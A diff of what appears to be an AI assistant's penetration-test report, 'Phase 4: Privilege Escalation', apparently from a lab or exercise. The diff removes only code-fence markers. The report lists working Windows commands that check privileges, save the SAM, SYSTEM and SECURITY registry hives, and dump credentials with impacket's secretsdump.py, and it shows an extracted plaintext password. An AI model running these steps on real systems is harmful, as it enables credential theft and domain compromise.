@@ -1,6 +1,6 @@
 Sure! Here's your complete **Phase 4: Privilege Escalation** report in a single code block for easy copy-paste:
 
-```
+
 =========================
 Phase 4: Privilege Escalation
 =========================
@@ -26,13 +26,13 @@ Steps and Observations:
 
 1. **Verified Privilege Rights of the Compromised User**
    Command:
-```
+
 
 whoami /priv
 
-```
+
 Result:
-```
+
 
 User had several high-level privileges enabled:
 
@@ -42,33 +42,33 @@ User had several high-level privileges enabled:
 * SeTakeOwnershipPrivilege
 * SeImpersonatePrivilege
 
-```
+
 
 2. **Confirmed Domain Admin Group Membership**
 Command:
-```
+
 
 net user bob /domain
 
-```
+
 Result:
-```
+
 
 Global Group memberships:
 \*Domain Users
 \*Domain Admins
 
-```
+
 
 3. **Exported the Windows Registry Hives from Target**
 Commands run on the compromised machine:
-```
+
 
 reg save hklm\sam C:\Users\Public\sam.save
 reg save hklm\system C:\Users\Public\system.save
 reg save hklm\security C:\Users\Public\security.save
 
-```
+
 
 4. **Transferred Registry Files to Attacker Machine**
 Method used:
@@ -77,11 +77,11 @@ Method used:
 
 5. **Dumped Credentials using secretsdump.py**
 Command:
-```
+
 
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
 
-```
+
 
 Output Highlights:
 - Extracted plaintext password: `mr404`
